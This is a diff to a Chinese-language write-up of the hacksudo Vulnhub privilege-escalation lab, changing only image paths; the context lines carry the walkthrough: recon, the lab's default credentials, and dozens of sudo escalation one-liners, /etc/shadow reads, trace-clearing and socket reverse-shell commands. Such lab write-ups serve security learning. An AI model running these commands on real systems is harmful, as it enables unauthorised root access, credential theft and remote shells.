@@ -10,23 +10,23 @@
 
 使用`arp-scan -l`或`netdiscover -r 192.168.1.1/24`等工具
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\1.jpg)
+![](./pic-lpe/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\2.jpg)
+![](./pic-lpe/2.jpg)
 
 ## 网站探测
 
 访问默认网站
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\3.jpg)
+![](./pic-lpe/3.jpg)
 
 查看页面源代码，发现有提示，说在当前页面找到用户名和密码是很简单的。并且确实存在用户名`admin`以及密码`hacksudo`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\4.jpg)
+![](./pic-lpe/4.jpg)
 
 扫描网站目录，因为在访问默认界面时，跳转到`login.php`，说明目录型网站，脚本语言`php`
 
@@ -36,43 +36,43 @@
 gobuster dir -u http://192.168.1.52 -w /usr/share/wordlists/dirb/big.txt -x php,bak,txt,js,html,md -b 403-404
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\5.jpg)
+![](./pic-lpe/5.jpg)
 
 访问各个目录进行查看
 
 访问`README.md`，给出这个登录时的信息，并且怎么使用等信息
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\6.jpg)
+![](./pic-lpe/6.jpg)
 
 访问`accounts.html`，发现直接显示以登录，并且可以上传图片
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\7.jpg)
+![](./pic-lpe/7.jpg)
 
 访问`challenge`，发现是一个类似于靶场的过关，且可能是`docker`搭建，在其中发现有的文件指向`https://192.168.1.52:4200`，文件太多，这里暂且记住
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\8.jpg)
+![](./pic-lpe/8.jpg)
 
 
 
 访问`img`目录，发现在`accounts.html`中的一张图片，猜测上传的话，可能是到此目录
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\9.jpg)
+![](./pic-lpe/9.jpg)
 
 
 
 访问`product.html`，发现也是直接以`admin`登录，并且可以删除和添加
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\10.jpg)
+![](./pic-lpe/10.jpg)
 
 访问其添加时，发现也是可以上传图片
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\11.jpg)
+![](./pic-lpe/11.jpg)
 
 
 
 访问`https://192.168.1.52:4200`，是一个在线`shell`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\12.jpg)
+![](./pic-lpe/12.jpg)
 
 
 
@@ -82,7 +82,7 @@ gobuster dir -u http://192.168.1.52 -w /usr/share/wordlists/dirb/big.txt -x php,
 
 以用户`admin`和密码`hacksudo`登录`login.php`，发现跳转到`challenge`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\13.jpg)
+![](./pic-lpe/13.jpg)
 
 
 
@@ -98,23 +98,23 @@ gobuster dir -u http://192.168.1.52 -w /usr/share/wordlists/dirb/big.txt -x php,
 
 点击上图中的`challenge1`，给出一个可点超链接，并提示第一关是`apt-get`提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\14.jpg)
+![](./pic-lpe/14.jpg)
 
 点击后给出登录信息，并且点击`browser console`后，跳转`4200`端口，也就是使用这个账户密码可以登录
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\15.jpg)
+![](./pic-lpe/15.jpg)
 
 测试可以登录
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\16.jpg)
+![](./pic-lpe/16.jpg)
 
 虽然给出是`apt-get`提权，但还是使用`find`搜索，然后`sudo -l`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\17.jpg)
+![](./pic-lpe/17.jpg)
 
 对于这个提权方式，网页中给了链接，可以在这个链接中学习如何使用，但是国外访问，太卡，使用`gtfobins.github.io`网站学习，三种方式
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\18.jpg)
+![](./pic-lpe/18.jpg)
 
 ###### 方式一
 
@@ -125,9 +125,9 @@ sudo apt-get changelog apt
 
 进入后，直接键盘输入`!/bin/sh`即可使用`root`唤起一个shell
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\19.jpg)
+![](./pic-lpe/19.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\20.jpg)
+![](./pic-lpe/20.jpg)
 
 ###### 方式二
 
@@ -137,7 +137,7 @@ echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
 sudo apt-get install -c $TF sl
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\21.jpg)
+![](./pic-lpe/21.jpg)
 
 ###### 方式三
 
@@ -147,11 +147,11 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
 获取`flag`为`viluhacker`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\22.jpg)
+![](./pic-lpe/22.jpg)
 
 返回输入`flag`，提示完成
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\23.jpg)
+![](./pic-lpe/23.jpg)
 
 然后点击就是下一关
 
@@ -161,11 +161,11 @@ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 
 使用提供的用户名和密码登录，估计后面都是使用`sudo -l`查看，然后提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\24.jpg)
+![](./pic-lpe/24.jpg)
 
 查看`arp`提权方式，这个其实就是可以越权查看文件，可以查看`shadwo`等文件，然后破解
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\25.jpg)
+![](./pic-lpe/25.jpg)
 
 ```
 LFILE=/root/root.txt
@@ -174,7 +174,7 @@ sudo arp -v -f "$LFILE"
 
 这里是以为知道放在这里，所以直接查看这个文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\26.jpg)
+![](./pic-lpe/26.jpg)
 
 ###### 疑问
 
@@ -182,13 +182,13 @@ sudo arp -v -f "$LFILE"
 
 尝试使用`user1`以及密码测试`ssh`能否可登录，发现可以，啧
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\27.jpg)
+![](./pic-lpe/27.jpg)
 
 然后发现操作与在`4200`端口操作一样，就可以提权至`root`，怀疑不是靶机，是靶机上的`docker`
 
 使用`ip addr`查看`ip`信息，存在，估计就是了
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\28.jpg)
+![](./pic-lpe/28.jpg)
 
 但是测试退出`docker`的方法，使用`exit`或者`ctrl+d`都没有退出，说明可能不是在`docker`中，
 
@@ -200,44 +200,44 @@ sudo arp -v -f "$LFILE"
 
 ## awk提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\29.jpg)
+![](./pic-lpe/29.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\30.jpg)
+![](./pic-lpe/30.jpg)
 
 ```shell
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\31.jpg)
+![](./pic-lpe/31.jpg)
 
 ## base32提权
 
 这里是以读取文件为主
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\32.jpg)
+![](./pic-lpe/32.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\33.jpg)
+![](./pic-lpe/33.jpg)
 
 ```shell
 LFILE=/etc/shadow
 sudo base32 "$LFILE" | base32 --decode
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\34.jpg)
+![](./pic-lpe/34.jpg)
 
 ## base64提权
 
 与前面的`base32`差不多
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\35.jpg)
+![](./pic-lpe/35.jpg)
 
-![36](D:\stu\vulnhub\hacksudo靶场\pic-lpe\36.jpg)
+![36](./pic-lpe/36.jpg)
 
 ## cat提权
 
 也是越权读取文件，并不能直接唤起shell终端
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\37.jpg)
+![](./pic-lpe/37.jpg)
 
 
 
@@ -250,9 +250,9 @@ file="/etc/shadow"
 sudo comm $file /dev/null 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\38.jpg)
+![](./pic-lpe/38.jpg)
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\39.jpg)
+![](./pic-lpe/39.jpg)
 
 
 
@@ -260,7 +260,7 @@ sudo comm $file /dev/null 2>/dev/null
 
 这个方式很多
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\40.jpg)
+![](./pic-lpe/40.jpg)
 
 
 
@@ -268,7 +268,7 @@ sudo comm $file /dev/null 2>/dev/null
 
 越权复制、读取文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\41.jpg)
+![](./pic-lpe/41.jpg)
 
 ###### 方式二
 
@@ -281,7 +281,7 @@ echo "DATA" > $TF
 sudo cp $TF $LFILE
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\42.jpg)
+![](./pic-lpe/42.jpg)
 
 ###### 方式三
 
@@ -298,11 +298,11 @@ sudo cp
 
 ## curl提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\43.jpg)
+![](./pic-lpe/43.jpg)
 
 简单来说，就是可以通过这个命令下载一些文件、脚本等
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\44.jpg)
+![](./pic-lpe/44.jpg)
 
 但是因为是提权下载，这里我暂时还没理解可以做什么
 
@@ -310,11 +310,11 @@ sudo cp
 
 ## cut提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\45.jpg)
+![](./pic-lpe/45.jpg)
 
 `cut` 命令在 Linux 中主要用于从文本文件或者标准输入中提取特定列或者字段。它可以按照字节（`-b` 选项）、字符（`-c` 选项）或者字段（`-f` 选项）来进行切割操作，`-d`选项用于指定输入文本的字段分隔符
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\46.jpg)
+![](./pic-lpe/46.jpg)
 
 
 
@@ -322,7 +322,7 @@ sudo cp
 
 `dash`与`bash`和`sh`都是linux中的终端一种，平常使用`bash`偏多，不过这里的`sh`可能是软链接，最终指向的可能还是`dash`。
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\47.jpg)
+![](./pic-lpe/47.jpg)
 
 ## date提权
 
@@ -333,38 +333,38 @@ sudo date -f $LFILE
 
 主要用于越权查看文件
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\48.jpg)
+![](./pic-lpe/48.jpg)
 
 ## diff提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\49.jpg)
+![](./pic-lpe/49.jpg)
 
 ```
 LFILE="/etc/shadow"
 sudo diff --line-format=%L /dev/null $LFILE
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\50.jpg)
+![](./pic-lpe/50.jpg)
 
 ## find提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\51.jpg)
+![](./pic-lpe/51.jpg)
 
 ```shell
 sudo find . -exec /bin/sh \; -quit
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\52.jpg)
+![](./pic-lpe/52.jpg)
 
 
 
 ## ftp提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\53.jpg)
+![](./pic-lpe/53.jpg)
 
 在其加载界面时输入`bash`
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\54.jpg)
+![](./pic-lpe/54.jpg)
 
 ## gcc提权
 
@@ -372,7 +372,7 @@ sudo find . -exec /bin/sh \; -quit
 sudo gcc -wrapper /bin/sh,-s .
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\55.jpg)
+![](./pic-lpe/55.jpg)
 
 
 
@@ -382,11 +382,11 @@ sudo gcc -wrapper /bin/sh,-s .
 sudo gdb -nx -ex '!sh' -ex quit
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\56.jpg)
+![](./pic-lpe/56.jpg)
 
 ## ip提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\57.jpg)
+![](./pic-lpe/57.jpg)
 
 
 
@@ -398,7 +398,7 @@ sudo gdb -nx -ex '!sh' -ex quit
 sudo ip -force -batch "/etc/shadow"
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\58.jpg)
+![](./pic-lpe/58.jpg)
 
 ###### 获取shell
 
@@ -408,7 +408,7 @@ sudo ip netns exec foo /bin/sh
 sudo ip netns delete foo	//退出提权后清除痕迹
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\59.jpg)
+![](./pic-lpe/59.jpg)
 
 
 
@@ -420,7 +420,7 @@ sudo ip netns delete foo
 sudo ip netns delete bar
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\60.jpg)
+![](./pic-lpe/60.jpg)
 
 ## pip提权
 
@@ -438,7 +438,7 @@ sudo pip install $TF
 sudo perl -e 'exec "/bin/sh";'
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\61.jpg)
+![](./pic-lpe/61.jpg)
 
 
 
@@ -454,7 +454,7 @@ RPORT=1234
 socket -qvp '/bin/sh -i' $RHOST $RPORT
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\62.jpg)
+![](./pic-lpe/62.jpg)
 
 ###### 正向连接
 
@@ -463,7 +463,7 @@ LPORT=1234
 socket -svp '/bin/sh -i' $LPORT
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\63.jpg)
+![](./pic-lpe/63.jpg)
 
 ## vi提权
 
@@ -471,11 +471,11 @@ socket -svp '/bin/sh -i' $LPORT
 sudo vi -c ':!/bin/sh' /dev/null
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\64.jpg)
+![](./pic-lpe/64.jpg)
 
 ## view提权
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\65.jpg)
+![](./pic-lpe/65.jpg)
 
 三种方式，不过有条件
 
@@ -485,7 +485,7 @@ sudo vi -c ':!/bin/sh' /dev/null
 sudo view -c ':!/bin/sh'
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\66.jpg)
+![](./pic-lpe/66.jpg)
 
 ###### 方式二
 
@@ -516,7 +516,7 @@ echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
 sudo wget --use-askpass=$TF 0
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\67.jpg)
+![](./pic-lpe/67.jpg)
 
 
 
@@ -528,7 +528,7 @@ sudo wget --use-askpass=$TF 0
 sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
 ````
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\68.jpg)
+![](./pic-lpe/68.jpg)
 
 ## xxd提权
 
@@ -539,7 +539,7 @@ sudo xxd "$LFILE" | xxd -r
 
 主要用于越权读取
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\69.jpg)
+![](./pic-lpe/69.jpg)
 
 
 
@@ -551,7 +551,7 @@ sudo zip $TF /etc/hosts -T -TT 'sh #'
 sudo rm $TF								//清除临时文件
 ```
 
-![](D:\stu\vulnhub\hacksudo靶场\pic-lpe\70.jpg)
+![](./pic-lpe/70.jpg)
 
 
 
